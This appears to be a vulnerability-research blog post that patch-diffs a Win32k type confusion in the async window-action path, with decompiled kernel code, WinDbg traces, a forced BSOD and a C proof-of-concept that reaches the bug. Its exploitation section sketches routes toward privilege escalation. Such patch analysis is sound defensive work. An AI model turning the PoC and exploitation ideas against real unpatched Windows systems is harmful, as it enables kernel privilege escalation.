`_posts/2026-03-29-win32k-type-confusion-async-window-action-cmonitor.md`:

```md
---
title: "CVE-2026-20811: Win32k Type Confusion in Cloud-Deployed Feature Flag"
date: 2026-03-29
categories: [Vulnerability Research, Windows Internals]
tags: [win32k, type-confusion, cve, kernel, windows-internals, patch-diffing, ida-pro, windbg]
toc: true
---

CVE-2026-20811 is a type confusion in `win32kfull.sys` (KB5074109, CVSS 7.8). The bug is in the async window action processing path introduced by a feature flag rollout (`Feature_ApplyWindowActionConvergence`), where a kernel pointer to a `CMonitorTopology` object survives incomplete sanitization of a cross-thread message buffer and is dereferenced in the receiving thread's context. Note: despite being patched in the same KB as CVE-2026-20805 (a DWM information disclosure vulnerability patched in the same update), CVE-2026-20811 itself is not listed in the CISA KEV catalog and has no public reports of in-the-wild exploitation as of this writing.

This post walks through the feature flag gating, the root cause, how the async buffer leaks kernel pointers, and what Microsoft changed in the patch. This is part of an ongoing effort to review Patch Tuesday patches and do vulnerability analysis on the fixes. I picked this one from the January 2026 batch because I had not looked at a type confusion in a kernel driver before and wanted to work through one.

## Background: NtUserApplyWindowAction and Feature Flags

`NtUserApplyWindowAction` is a Win32k syscall for applying window positioning operations: moves, resizes, snap layouts, z-order changes. It copies a `_WINDOW_ACTION` struct from user mode and dispatches it through internal processing.

The vulnerable code path did not exist at RTM. It was introduced when Microsoft enabled `Feature_ApplyWindowActionConvergence` via cloud configuration on builds around 26100.7000+. The feature gates a new code path through `WindowActions::xxxApplyAction` instead of the legacy `WindowActions::xxxApplyActionOld`. The new path handles cross-thread window actions differently, and that difference is where the bug lives.

```
26100.1      RTM. Feature OFF. Legacy path (xxxApplyActionOld). SAFE.
~26100.7000  Feature enabled via cloud rollout. New async path active.
             PostAsyncWindowAction copies full 0xB8 internal struct.
             CMonitorTopology* at +0xA8 survives sanitization. VULNERABLE.
26100.7309   Last vulnerable build. Feature ON, bug reachable.
26100.7623   Fix ships (KB5074109). Feature DISABLED via cloud config.
             Vulnerable code unchanged but unreachable. Safe alternative
             (event type 31, 0x60-byte copy) exists as dead code. MITIGATED.
```

This is a pattern worth tracking in modern Windows. Features ship via cloud config independently of OS builds. The vulnerability window is between feature enablement and security patch, and it can be invisible to anyone not tracking feature flag state.

## Attack Surface Analysis

### BinDiff Results

BinDiff between `win32kfull.sys` 10.0.26100.7309 (pre-patch) and 10.0.26100.7623 (post-patch) showed 99.25% overall similarity across 11,483 matched functions. Four functions changed:

| Function | Similarity | Basic Blocks |
|----------|-----------|--------------|
| `NtUserApplyWindowAction` | 93.2% | 54 |
| `NtUserSetWindowsHookAW` | 87.9% | 9 |
| `zzzSetWindowsHookEx` | 97.1% | 138 |
| `NtUserSetWindowsHookEx` | 97.3% | 51 |

`NtUserApplyWindowAction` at 93.2% similarity with 54 basic blocks is the primary target. The other three functions relate to a secondary fix for a hook handle return logic inversion, which I won't cover in detail here.

### Entry Points and Gates

On the pre-patch build (26100.7309), reaching the vulnerable code requires passing through two gates:

**Gate 1: Feature_ApplyWindowActionConvergence.** The feature flag's `featureState` must have bit 0 set (enabled). On production builds ~26100.7000+, this was enabled via cloud rollout. On my evaluation build (26100.5074), it was disabled (`featureState = 0x16`, bit 0 clear).

```
0: kd> dd fffff805`13e0c768 L1
fffff805`13e0c768  00000016
```

The feature evaluation function (`Feature_H2E_WPA3SAE__private_IsEnabledDeviceUsage_1` in IDA, reading from `Feature_ApplyWindowActionConvergence__private_featureState`) evaluates the feature state in two sequential stages. First, `test al, 10h` checks bit 4 as a fast-path gate: if bit 4 is clear, evaluation falls through to `IsEnabledFallback()`, a slower evaluation path that may check additional state. With `featureState = 0x16`, bit 4 is set (`0x16 & 0x10 = 0x10`), so the fast path passes and evaluation continues. Second, `and eax, 1` extracts bit 0, the actual enabled/disabled bit. With `0x16`, bit 0 is clear, so the feature evaluates as disabled. Patching to `0x17` sets bit 0, making the feature evaluate as enabled while preserving the fast-path gate.

**Gate 2: IAMThreadAccessGranted.** For cross-thread calls (where the caller thread does not own the target window), `xxxApplyAction` calls `IAMThreadAccessGranted`. This is expected to return TRUE for UWP apps and IAM-granted contexts. Standard Win32 apps fail this check.

On the evaluation build (26100.5074), there was a third gate (`IsAppModelFeatureEnabled`, checking `PEB+0x340` bit 0 for UWP context), but IDA analysis of the actual vulnerable build (26100.7309) confirmed this check does not exist there. The `xxxApplyAction` function on 26100.7309 checks DPI awareness, `IAMThreadAccessGranted`, `ValidateHwnd`, `IsTopLevelWindow`, and thread ownership, but not `IsAppModelFeatureEnabled`.

The DPI awareness check requires `SetProcessDpiAwarenessContext(-4)` (Per Monitor v2), which any Medium-IL process can call.

### Reaching the Async Path

The bug is specifically in the **cross-thread async** path. When `xxxApplyAction` determines that the caller thread is not the window owner thread (and `IAMThreadAccessGranted` returns TRUE), it sets `flags2` bit 0x800 in the internal `CWindowAction` struct:

```c
// xxxApplyAction - thread ownership check
if ( v14 == v9 )             // same thread owns the window
{
    v36 |= 0x2000u;          // bit 0x2000 = same-thread
}
else
{
    v36 |= 0x800u;           // bit 0x800 = cross-thread
    v40 = *((_QWORD *)v12 + 2);   // store target threadinfo
}
```

This causes `xxxApplyWindowAction` to call `PostAsyncWindowAction` instead of processing the action synchronously:

```c
// xxxApplyWindowAction - async dispatch gate
if ( Feature_ApplyWindowActionConvergence()
     && (*(_DWORD *)(a2 + 4) & 0x800) != 0 )    // flags2 & 0x800 (cross-thread)
{
    AdvancedWindowPos::PostAsyncWindowAction(a1, a2, v4);
    return;
}
```

## The Vulnerability

### Root Cause

`AdvancedWindowPos::PostAsyncWindowAction` allocates **0xB8 bytes**, copies the full internal `CWindowAction` struct into it, and posts this buffer as **event type 0x1C (28)** to the target thread's message queue:

```c
// PostAsyncWindowAction - allocation and copy
v22 = Win32AllocPoolZInit(0xB8, 0x70776155);   // 0xB8 bytes, pool tag 'Uawp'

*(_OWORD *)v22 = *(_OWORD *)a2;               // 0x00-0x0F
*(_OWORD *)(v22 + 16) = *((_OWORD *)a2 + 1);  // 0x10-0x1F
*(_OWORD *)(v22 + 32) = *((_OWORD *)a2 + 2);  // 0x20-0x2F
// ... (11 OWORD copies = 176 bytes)
*(_QWORD *)(v22 + 176) = *((_QWORD *)v30 + 6); // 0xB0-0xB7
// Total: 176 + 8 = 184 = 0xB8

PostEventMessageEx(..., 0x1Cu, ..., v22, ...);  // post as event type 0x1C
```

The `CWindowAction` struct at this point contains kernel pointers that were populated during processing on the caller's thread.

When the target thread pumps messages (`PeekMessage`/`GetMessage`), `xxxProcessEventMessage` dispatches event 0x1C to `AdvancedWindowPos::xxxProcessAsyncWindowAction`. This function performs a partial sanitization of the buffer before passing it to `xxxApplyWindowAction`. Here is the decompiled function from the pre-patch binary (26100.7309), annotated with the three fields it zeros and the one it misses:

```c
void __fastcall AdvancedWindowPos::xxxProcessAsyncWindowAction(
        HWND hwndFromEvent,       // rcx: HWND from PostEventMessageEx
        __int64 asyncBuffer)      // rdx: the 0xB8-byte copied buffer
{
    tagWND *pwnd = HMValidateHandleNoSecure(hwndFromEvent, 1);
    if (!pwnd || !IsTopLevelWindow(pwnd))
        return;  // window gone or not top-level, bail

    tagTHREADINFO *pti = PtiCurrent();
    Win32HM_LockIntoThread(pti, pwnd, ...);

    //
    // Check for recalc display change (flags1 & 0x200 with flags2 & 0x10000)
    //
    if ((*(_DWORD *)asyncBuffer & 0x200) != 0
        && (*((_DWORD *)asyncBuffer + 1) & 0x10000) != 0
        && (*((_DWORD *)pwnd + 95) & 0x10) == 0)
    {
        // WPP tracing only, no action applied
        return;
    }

    //
    // SANITIZATION (incomplete)
    //
    *((_DWORD *)asyncBuffer + 1) &= ~0x800u;   // [1] +0x04: clear cross-thread bit
    *((_QWORD *)asyncBuffer + 18) = 0;          // [2] +0x90: zero tagTHREADINFO*
    *((_BYTE *)asyncBuffer + 176) = 0;          // [3] +0xB0: zero byte

    // NOTE: +0xA8 (CMonitorTopology*) is NOT zeroed here.
    //       It survives into xxxApplyWindowAction and gets dereferenced.

    // Pass the full 0xB8 buffer to xxxApplyWindowAction
    AdvancedWindowPos::xxxApplyWindowAction(pwnd, asyncBuffer);
}
```

Three fields sanitized. The `CMonitorTopology*` at **offset +0xA8** is not zeroed. It survives sanitization and is dereferenced by `xxxApplyWindowAction`:

```c
// xxxApplyWindowAction+0xa86
CMonitorTopology *topology = *(CMonitorTopology **)(buffer + 0xA8);
CMonitorTopology::MonitorDataFromRect(topology, ...);   // DEREFERENCE
```

Further down, a double dereference occurs:

```c
*(_DWORD *)(*(_QWORD *)(buffer + 0xA8) + 12LL)   // *(*(buffer+0xA8)+0xC)
```

This value is passed to `CDwmWindowNotifyBatch::OnRecalcActionApplied`.

The `CMonitorTopology*` was placed in the buffer during Thread A's context (the caller thread). It is dereferenced in Thread B's context (the window owner thread) without validation. MSRC classifies this as both CWE-822 (Untrusted Pointer Dereference) and CWE-843 (Type Confusion). I think CWE-843 is the more precise classification: the buffer contains kernel-internal state that is reinterpreted as window action parameters on the receiving end. The pointer itself is a valid kernel object, not a user-supplied address, but the async boundary changes the trust context in which it is accessed.

### Buffer Layout

The 0xB8-byte async buffer has the following structure at the relevant offsets:

| Offset | Size | Type | Content | Sanitized? |
|--------|------|------|---------|-----------|
| +0x00 | 4 | `DWORD` | flags1 (e.g. 0x06) | No |
| +0x04 | 4 | `DWORD` | flags2 (bit 0x800 = cross-thread) | Yes (bit cleared) |
| +0x90 | 8 | `tagTHREADINFO*` | caller's thread info pointer | Yes (zeroed) |
| +0xA8 | 8 | `CMonitorTopology*` | monitor topology object pointer | **No** |
| +0xB0 | 1 | `BYTE` | unknown flag | Yes (zeroed) |

Three fields sanitized out of at least four kernel-internal fields in a 0xB8-byte struct. The sanitization was done by hand, field by field, and it missed one.

### The Type Confusion (CWE-843)

The type confusion is structural: the 0xB8-byte `CWindowAction` has a user zone and a kernel zone, though the boundary is not a clean split. `ResolvePublicWindowAction` validates the user-supplied `_WINDOW_ACTION` (0x60 bytes) and maps it into the internal `CWindowAction` at offsets +0x00 through +0x6B (flags, position, size, rects, snap state, and two display-change fields at +0x60 (target DPI value from `_WINDOW_ACTION+0x4C`, minimum 96, gated by `flags2 & 0x200`) and +0x64 (source point for monitor lookup from `_WINDOW_ACTION+0x50`, a QWORD consumed as X/Y by `MonitorDataFromRect`)). Offsets +0x04 (`flags2`) are shared: the user supplies bits and the kernel adds 0x800/0x2000 during processing. Offsets +0x6C through +0x8F appear to be gap space (zero-initialized, not written by either side in the paths I traced). The kernel populates fields at +0x90 and beyond during processing: `tagTHREADINFO*` at +0x90, `CMonitorTopology*` at +0xA8, and internal flags at +0xB0.

When `xxxProcessAsyncWindowAction` passes the full 0xB8 buffer to `xxxApplyWindowAction`, the kernel-internal zone is interpreted as if it contains valid `WindowAction` fields. Which offsets get read depends on the `flags1` and `flags2` bits in the buffer. Different flag combinations activate different code paths in `xxxApplyWindowAction`, each reading different offsets as coordinates, DPI values, rect structures, or pointers.

To verify this, I bruteforced flag combinations and monitored which code paths were reached on the async path via WinDbg breakpoints:

| flags1 | flags2 (effective) | Code path reached | Kernel data read |
|--------|-------------------|-------------------|-----------------|
| 0x06 | 0x00 | `MonitorDataFromRect` | +0xA8 as `CMonitorTopology*` |
| 0x106 | 0x00 | `xxxModifyActionForArrangement` | +0xA8 as `CMonitorTopology*`, +0x64 as POINT |
| 0x06 | 0x40000 | arrangement rect path | +0x98 as `tagRECT` (kernel data) |
| 0x06 | 0x10000 | `OnRecalcActionApplied` | `*(*(buffer+0xA8)+12)` double dereference |

![Flag-driven code path diagram](/assets/img/posts/2026-03-22_flag_code_paths.png)
_Async dispatch flow: `PostAsyncWindowAction` copies the 0xB8 buffer, `xxxProcessAsyncWindowAction` sanitizes 3 of 4 kernel fields, and `xxxApplyWindowAction` dispatches to different code paths based on the user-controlled flags. All four paths read from the kernel-internal zone of the buffer._

The flags2 values that passed validation and reached the async path: `0x00`, `0x01`, `0x10`, `0x20`, `0x40`, `0x80`, `0x100` (rejected), `0x200`, `0x400` (rejected), `0x10000`, `0x40000`. The kernel rejects certain bits in `ResolvePublicWindowAction`, but many pass through and activate code paths that read from the kernel-internal zone of the buffer.

For example, with `flags2=0x40000`, the arrangement rect path reads a `tagRECT` from offset +0x98 of the buffer. On the async path, +0x98 contains kernel-internal data (zeros in my testing, but potentially non-zero under different window states). The code treats these bytes as window coordinates and feeds them into positioning calculations.

The `flags2=0x10000` path is particularly interesting: it triggers a double dereference `*(_DWORD *)(*(_QWORD *)(buffer + 0xA8) + 12)`, reading a DWORD from `CMonitorTopology+12` and passing it to `CDwmWindowNotifyBatch::OnRecalcActionApplied`. An attacker who could control the memory at the topology address would control this value.

This is the core of CWE-843: data of one type (internal kernel state) is accessed as another type (user window action parameters). The incomplete sanitization in `xxxProcessAsyncWindowAction` is the gate failure that allows this type confusion to reach `xxxApplyWindowAction`.

### WinDbg Confirmation

Testing on build 26100.7309 with two WinDbg patches applied (feature flag enabled, `IAMThreadAccessGranted` patched to `mov eax, 1; ret`):

**The buffer arrives on Thread B with kernel pointers intact.** When `xxxProcessAsyncWindowAction` is hit, `rdx` points to the 0xB8-byte copied buffer. Dumping the flags at the start shows `flags1=0x06` (position+size) and `flags2=0x0800` (cross-thread bit, set by the kernel). The kernel zone starting at +0x6C is mostly zeros for this flag combination, but +0x90 contains a `tagTHREADINFO*` from the calling thread, and +0xA8 contains a `CMonitorTopology*`. The call stack confirms this is the async dispatch path through `xxxProcessEventMessage` from Thread B's `PeekMessage` call:

```
0: kd> dd @rdx L2
ffff8087`f94e9d30  00000006 00000800

0: kd> dq @rdx+0x90 L1
ffff8087`f94e9dc0  ffff8087`f785f010

0: kd> dq @rdx+0xA8 L1
ffff8087`f94e9dd8  ffff8087`fc9e5f90

0: kd> kb L6
 # RetAddr               : Args to Child                                                           : Call Site
00 fffff801`222305e0     : ffff8087`f785f010 fffff18c`48aebc00 : win32kfull!AdvancedWindowPos::xxxProcessAsyncWindowAction
01 fffff801`2226d874     : fffff18c`48aec9c0 00000000`00000000 : win32kfull!xxxProcessEventMessage+0x814
02 fffff801`220e84db     : 00000000`0000304f 00000000`00000001 : win32kfull!xxxScanSysQueue+0xa30
03 fffff801`220e7926     : fffff18c`48aec9c0 fffff801`21862ca6 : win32kfull!xxxRealInternalGetMessage+0xa3f
04 fffff801`220e780d     : 00000000`00000000 000000d3`e30ff7e0 : win32kfull!xxxInternalGetMessage+0x76
05 fffff801`1dd11077     : 00000000`00000000 00000000`00000000 : win32kfull!NtUserPeekMessage+0xfd
```

**After sanitization, `xxxApplyWindowAction` loads the surviving `CMonitorTopology*` from the buffer.** At offset `+0xa86` into the function, the instruction `mov rcx, [r15+0A8h]` loads the kernel pointer from the async buffer (pointed to by `r15`) into `rcx`, which is then passed as the first argument to `CMonitorTopology::MonitorDataFromRect`. This is the type confusion in action: a kernel-internal field from the `CWindowAction` struct is read as a `WindowAction` parameter and dereferenced in the receiving thread's context:

```
0: kd> r r15
r15=ffff8087f94e9d30

0: kd> dq @r15+0xa8 L1
ffff8087`f94e9dd8  ffff8087`fc9e5f90

0: kd> u @rip L1
win32kfull!AdvancedWindowPos::xxxApplyWindowAction+0xa86:
fffff801`222c7c6a 498b8fa8000000  mov     rcx,qword ptr [r15+0A8h]
```

The `CMonitorTopology*` value `ffff8087'fc9e5f90` is loaded into `rcx` and passed directly to `MonitorDataFromRect`, which dereferences it to read monitor topology data. This was confirmed across 26+ iterations with varying topology addresses. The pointer consistently survives sanitization and is dereferenced.

![CMonitorTopology* at buffer+0xA8 loaded into rcx for dereference by MonitorDataFromRect](/assets/img/posts/2026-03-22_windbg_type_confusion.png)
_Figure 1: The async buffer arrives on Thread B via `xxxProcessAsyncWindowAction`. The buffer dump shows `flags1=0x06`, `flags2=0x0800` (cross-thread), and the `CMonitorTopology*` at `+0xA8` (`ffff8087'fc9e5f90`). At `xxxApplyWindowAction+0xa86`, the instruction `mov rcx,[r15+0A8h]` loads this kernel pointer into `rcx` for dereference by `MonitorDataFromRect`._

### Pool Verification

`!pool` on the buffer address confirms the allocation metadata:

```
0: kd> !pool ffffc580968101e0
*ffffc580968101e0 size:   d0 previous size:    0  (Allocated) *Uawp
        Pooltag Uawp : USERTAG_AWP, Binary : win32kfull!AdvancedWindowPos
```

Paged pool, tag `Uawp` (`USERTAG_AWP`), allocation size 0xD0 (0xB8 usable + 0x18 pool header/alignment). The uniform 0xD0 allocation sizes on the pool page are consistent with kLFH servicing this bucket, which is relevant for any heap-based exploitation strategy targeting this allocation.

### BSOD Confirmation

To confirm the dereference is reachable and crashes when the `CMonitorTopology` object is invalid, I zeroed the pointer at +0xA8 via a WinDbg conditional breakpoint on `xxxProcessAsyncWindowAction` (simulating a freed topology). The system immediately bugchecks with `SYSTEM_SERVICE_EXCEPTION (3b)` when `MonitorDataFromRect` attempts to access the NULL object:

```
0: kd> !analyze -v

SYSTEM_SERVICE_EXCEPTION (3b)
An exception happened while executing a system service routine.
Arguments:
Arg1: 00000000c0000005, Exception code that caused the BugCheck
Arg2: fffff80122011530, Address of the instruction which caused the BugCheck

Failure.Bucket: AV_win32kfull!CMonitorTopology::MonitorDataFromRect

CONTEXT:  fffff18c44af9eb0 -- (.cxr 0xfffff18c44af9eb0)
rax=0000000000000000 rbx=fffff18c44afaab0 rcx=00000000000001ff
rdx=0000000000000064 rsi=0000000000000004 rdi=0000000000000384
rip=fffff80122011530 rsp=fffff18c44afa8e0 rbp=0000000000000004
 r8=0000000000000002  r9=0000000000000000

win32kfull!CMonitorTopology::MonitorDataFromRect+0x6c:
fffff801`22011530 44394d00        cmp     dword ptr [rbp],r9d ss:0018:00000000`00000004=????????

PROCESS_NAME:  poc_async_tc.exe

STACK_TEXT:
fffff18c`44afa8e0 fffff801`222c7c85 : win32kfull!CMonitorTopology::MonitorDataFromRect+0x6c
fffff18c`44afa9c0 fffff801`222c909f : win32kfull!AdvancedWindowPos::xxxApplyWindowAction+0xaa1
fffff18c`44afab30 fffff801`222305e0 : win32kfull!AdvancedWindowPos::xxxProcessAsyncWindowAction+0x12f
fffff18c`44afaba0 fffff801`2226d874 : win32kfull!xxxProcessEventMessage+0x814
fffff18c`44afacc0 fffff801`220e84db : win32kfull!xxxScanSysQueue+0xa30
fffff18c`44afb6a0 fffff801`220e7926 : win32kfull!xxxRealInternalGetMessage+0xa3f
fffff18c`44afb930 fffff801`220e780d : win32kfull!xxxInternalGetMessage+0x76
fffff18c`44afb970 fffff801`1dd11077 : win32kfull!NtUserPeekMessage+0xfd
fffff18c`44afba20 fffff801`8c4b5658 : win32k!NtUserPeekMessage+0x67
fffff18c`44afba70 00007ffd`d91712c4 : nt!KiSystemServiceCopyEnd+0x28
00000038`b3cffa18 00007ffd`da9fe0ef : win32u!NtUserPeekMessage+0x14
00000038`b3cffa20 00007ffd`da9fe078 : USER32!_PeekMessage+0x3f
00000038`b3cffa90 00007ff7`c9bd1155 : USER32!PeekMessageW+0x168
00000038`b3cffb00 00000000`0005030a : poc_async_tc+0x1155
```

The faulting instruction `cmp dword ptr [rbp], r9d` with `rbp=0x4` is a NULL dereference: the zeroed `CMonitorTopology*` was loaded, `MonitorDataFromRect` computed a field offset (+0x4) from the NULL base, and the read at address 0x4 triggered the access violation. Note: the stack shows `xxxApplyWindowAction+0xaa1` rather than `+0xa86` because `+0xa86` is the `mov rcx,[r15+0A8h]` load instruction while `+0xaa1` is the return address after the `call` to `MonitorDataFromRect`. The full call stack traces back through `xxxProcessAsyncWindowAction` (the async event handler) to `NtUserPeekMessage` (Thread B's message pump) and finally to `poc_async_tc.exe` (the PoC).

This confirms the end-to-end crash path: user-mode PoC triggers a cross-thread `NtUserApplyWindowAction`, `PostAsyncWindowAction` copies the 0xB8-byte buffer with the `CMonitorTopology*` at +0xA8, Thread B's `PeekMessage` dispatches the event through `xxxProcessAsyncWindowAction` (which fails to sanitize +0xA8), and `xxxApplyWindowAction` dereferences the pointer via `MonitorDataFromRect`, causing a kernel bugcheck.

![BSOD at MonitorDataFromRect when CMonitorTopology* is invalid](/assets/img/posts/2026-03-22_windbg_bsod_analyze.png)
_Figure 2: `!analyze -v` output after the BSOD. The crash occurs at `CMonitorTopology::MonitorDataFromRect+0x6c` with `rbp=0x4` (NULL dereference at field +0x4). The call stack traces through `xxxProcessAsyncWindowAction` back to `poc_async_tc.exe`._

## The Patch

Comparing the pre-patch (26100.7309) and post-patch (26100.7623) binaries in IDA reveals something I didn't expect: **the vulnerable code path is identical in both binaries.**

`PostAsyncWindowAction` still allocates 0xB8 bytes, still copies the full internal struct, still posts event type 0x1C. `xxxProcessAsyncWindowAction` still zeros only the same three fields. `xxxApplyWindowAction` still dereferences the `CMonitorTopology*` at +0xA8 via `MonitorDataFromRect`. Every function in the vulnerable chain is byte-for-byte the same.

The BinDiff showed `NtUserApplyWindowAction` changed at 93.2% similarity. Here is the actual diff:

**Pre-patch `NtUserApplyWindowAction`:**
```c
if (!Feature_ApplyWindowActionConvergence()) {
    //
    // OLD path: xxxApplyActionOld (single variant)
    //
} else {
    xxxApplyAction(...);  // NEW path (vulnerable async dispatch)
}
```

**Post-patch `NtUserApplyWindowAction`** (note: the branch order is inverted relative to the pre-patch decompiler output, but the logic is identical: feature ON routes to the new path)**:**
```c
if (Feature_ApplyWindowActionConvergence()) {
    xxxApplyAction(...);  // NEW path (STILL here, identical code)
} else {
    //
    // OLD path: now sub-gated by a secondary feature flag (_41)
    //
    if (Feature_ApplyWindowActionConvergence_41()) {
        xxxApplyActionOld(...);  // variant A (new error handling)
    } else {
        xxxApplyActionOld(...);  // variant B (original)
    }
}
```

The 93.2% BinDiff delta comes entirely from the added `_41` sub-gate in the old path, which adds new error handling to `xxxApplyActionOld`. The hook handle return logic fix is separate and accounts for the changes in the other three functions (`NtUserSetWindowsHookAW`, `zzzSetWindowsHookEx`, `NtUserSetWindowsHookEx`). The new path containing the type confusion is untouched.

**The fix is feature flag disablement.** Microsoft disabled `Feature_ApplyWindowActionConvergence` via cloud configuration update, making `xxxApplyAction` unreachable. The vulnerable code remains as dead code in the patched binary.

This is the same mechanism that created the bug in the first place: the feature was cloud-enabled on ~26100.7000+ production builds (opening the vulnerability window), and the patch disables it via cloud config (closing the window). The binary update (KB5074109) ships the `_41` sub-gate for the old path, but the `featureState` in the post-patch binary is `0xFFFFFFFF` (the WFC sentinel, identical to pre-patch), meaning the feature enablement is controlled entirely via cloud configuration, not hardcoded in the binary. The code-level vulnerability in the async path is unchanged.

### The Safe Alternative (Dead Code in Both Binaries)

A properly designed alternative already exists in both the pre-patch and post-patch binaries. The event type 31 handler in `xxxProcessEventMessage` copies only 0x60 bytes and passes the `CMonitorTopology*` as a separate argument:

```c
// Event type 31 handler (present in BOTH pre-patch and post-patch)
v67 = *(_OWORD **)(eventMsg + 40);     // pointer to the async buffer
v68 = *(_QWORD *)(eventMsg + 32);      // CMonitorTopology* as separate param

v80[0] = *v67;        // copy bytes 0x00-0x0F
v80[1] = v67[1];      // copy bytes 0x10-0x1F
v80[2] = v67[2];      // copy bytes 0x20-0x2F
v80[3] = v67[3];      // copy bytes 0x30-0x3F
v80[4] = v67[4];      // copy bytes 0x40-0x4F
v80[5] = v67[5];      // copy bytes 0x50-0x5F
                       // bytes 0x60-0xB7: NOT COPIED

WindowActions::xxxApplyActionAsync(window, v68, v80);
```

This is an allow-list approach: only the first 0x60 bytes (the user-controlled `_WINDOW_ACTION` data) are copied. Everything from +0x60 through +0xB8, including the `CMonitorTopology*` at +0xA8, is not copied. The topology is passed as its own argument from a trusted source, not extracted from the untrusted async buffer.

This handler is not currently wired into the `PostAsyncWindowAction` path. It exists as separate infrastructure, likely intended for when Microsoft re-enables the feature with a proper code fix. Until then, the "fix" is the feature being off, and the vulnerable dead code remains in the binary. Worth monitoring in future Patch Tuesday updates. If `Feature_ApplyWindowActionConvergence` is ever re-enabled without switching the async path to event type 31, the type confusion returns.

## Exploitation Considerations

The primitive here is a kernel pointer dereference (`CMonitorTopology*`) in the target thread's context. `MonitorDataFromRect` reads topology fields, `PhysicalToLogicalDPIRect` performs DPI calculations using topology data, and `OnRecalcActionApplied` receives `*(topology+12)`. The double dereference pattern (`*(*(buffer+0xA8)+0xC)`) means an attacker who could control the memory at the `CMonitorTopology*` address would control values that flow into DPI calculations and DWM notifications.

The `CMonitorTopology*` in the async buffer **is reference-counted**. After successfully posting the event, `PostAsyncWindowAction` increments the topology's refcount:

```c
// PostAsyncWindowAction - after successful PostEventMessageEx
if ( PostEventMessageEx(...) )
{
    _InterlockedAdd(v24[21], 1u);   // v24[21] = *(buffer+0xA8) = CMonitorTopology*
                                    // increments refcount at *(CMonitorTopology+0)
}
```

The decompiler hides the two-step indirection. The assembly makes it explicit:

```asm
mov  rax, [rbx+0A8h]    ; load CMonitorTopology* from buffer+0xA8
lock add [rax], ebp      ; atomically: *(topology+0) += 1   (ebp = 1)
```

On cleanup, `CleanEventMessage` (case 0x1C) releases the reference and frees the buffer:

```c
// CleanEventMessage - event type 0x1C cleanup
case 0x1C:
    v3 = *((CMonitorTopology ***)a1 + 5);   // buffer pointer
    CMonitorTopology::Release(v3[21]);        // Release refcount at buffer + 0xA8
    Win32FreePool(v3);                        // free the 0xB8 buffer
```

This AddRef/Release pair keeps the topology object alive for the duration of the async event's lifetime and explains why my UAF attempts via `ChangeDisplaySettingsEx` racing were unsuccessful: the extra reference prevents the object from being freed while the event is in flight.

This makes direct use-after-free through topology object lifetime manipulation significantly harder. The topology would need to be freed through a path that bypasses the reference count, or the reference count itself would need to be corrupted.

Microsoft rated this CVSS 7.8 (EoP). No in-the-wild exploitation of this specific CVE has been publicly confirmed. Given the reference counting, a full exploitation chain would likely need to either: (1) find a path that frees the `CMonitorTopology` object without going through the reference count, or corrupt the reference count itself, or (2) exploit the cross-context nature of the bug (Thread A's topology used in Thread B's context) where the topology may be invalid if the threads are on different desktops or in different DPI contexts. The type confusion primitive (kernel-internal fields read as window action parameters) is the more immediately exploitable aspect, since the attacker controls which offsets get read via the flags in their input.

The trigger conditions (feature flag enabled, cross-thread call, IAM access, Per Monitor v2 DPI) are all satisfiable from a Medium-IL UWP app without any privilege escalation. UWP apps are expected to pass the `IAMThreadAccessGranted` check and can call `NtUserApplyWindowAction` through `win32u.dll`.

## PoC

The PoC creates two threads in the same process: Thread A (the caller) and Thread B (the window owner). Thread A calls `NtUserApplyWindowAction` targeting Thread B's window. Because the threads are different, the kernel sets `flags2` bit 0x800 (cross-thread) in the internal `CWindowAction`, which triggers `PostAsyncWindowAction` to post the 0xB8-byte buffer as an event to Thread B's message queue.

```c
//
// Thread B: creates a window and pumps messages
//
static unsigned __stdcall WindowOwnerThread(void *arg)
{
    WNDCLASSW wc = {0};
    wc.lpfnWndProc = DefWindowProcW;
    wc.hInstance = GetModuleHandleW(NULL);
    wc.lpszClassName = L"AsyncTC_B";
    RegisterClassW(&wc);

    HWND h = CreateWindowExW(0, L"AsyncTC_B", L"B",
                              WS_OVERLAPPEDWINDOW | WS_VISIBLE,
                              100, 100, 400, 300,
                              NULL, NULL, wc.hInstance, NULL);
    g_threadBWindow = h;

    MSG msg;
    while (g_keepRunning) {
        while (PeekMessageW(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }
        Sleep(1);
    }
    DestroyWindow(h);
    return 0;
}

//
// Thread A (main): fires cross-thread NtUserApplyWindowAction
//
int main()
{
    SetProcessDpiAwarenessContext((HANDLE)-4);

    //
    // Resolve NtUserApplyWindowAction from win32u.dll
    //
    HMODULE hWin32u = LoadLibraryW(L"win32u.dll");
    auto pApply = (BOOL(WINAPI*)(HWND, void*))
        GetProcAddress(hWin32u, "NtUserApplyWindowAction");

    //
    // Start Thread B with a window
    //
    _beginthreadex(NULL, 0, WindowOwnerThread, NULL, 0, NULL);
    Sleep(500);

    //
    // Craft _WINDOW_ACTION: position + size (flags1 = 0x06)
    //
    BYTE action[0x60] = {0};
    *(DWORD*)(action + 0x00) = 0x06;   // flags1: position + size
    *(DWORD*)(action + 0x0C) = 100;    // x
    *(DWORD*)(action + 0x10) = 100;    // y
    *(DWORD*)(action + 0x14) = 800;    // width
    *(DWORD*)(action + 0x18) = 600;    // height

    // Fire: Thread A -> Thread B's window (cross-thread)
    // Kernel sets flags2 |= 0x800 -> PostAsyncWindowAction fires
    // 0xB8-byte buffer with CMonitorTopology* at +0xA8 is posted
    BOOL result = pApply(g_threadBWindow, action);
    // result = TRUE, async event queued to Thread B
}
```

On execution, `NtUserApplyWindowAction` returns TRUE and Thread B's window repositions on each call. The flag bruteforce variant confirms the async path is taken across multiple flag combinations:

```
PS> .\poc_async_tc.exe
[*] Flag bruteforce to find async code paths

[+] Thread B: HWND=00000000000300B6 TID=8988
[+] Cross-thread OK

[*] Testing 5 flags1 x 31 flags2 = 155 combinations
[+] flags1=0x0006 flags2=0x00000 -> OK (async path taken)
[+] flags1=0x0006 flags2=0x00001 -> OK (async path taken)
[+] flags1=0x0006 flags2=0x00002 -> OK (async path taken)
[+] flags1=0x0006 flags2=0x00010 -> OK (async path taken)
[+] flags1=0x0006 flags2=0x00020 -> OK (async path taken)
[+] flags1=0x0006 flags2=0x00040 -> OK (async path taken)
[+] flags1=0x0006 flags2=0x00080 -> OK (async path taken)
[+] flags1=0x0006 flags2=0x00200 -> OK (async path taken)
[+] flags1=0x0006 flags2=0x01000 -> OK (async path taken)
[+] flags1=0x0006 flags2=0x10000 -> OK (async path taken)
[+] flags1=0x0006 flags2=0x40000 -> OK (async path taken)
...
```

No crash occurs under normal conditions because the topology is valid and reference-counted.

